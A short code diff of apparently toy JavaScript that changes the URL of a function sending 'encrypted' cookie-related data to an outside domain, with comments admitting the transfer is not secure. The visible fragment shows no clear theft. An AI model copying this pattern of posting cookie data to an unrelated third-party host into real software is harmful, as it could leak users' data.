@@ -24,7 +24,7 @@ function createEncryptedCookie(name, value) {
 // Function to send encrypted data to the server
 function sendDataToServer(server) {
   // In a real-world application, you would use HTTPS and a secure API endpoint
-  const serverUrl = 'https://taxithassoslimenariapotos.com/server';
+  const serverUrl = 'https://taxithassoslimenariapotos.com/server.js';
   
   // Simulate sending encrypted data to the server (not secure)
   fetch(serverUrl, {
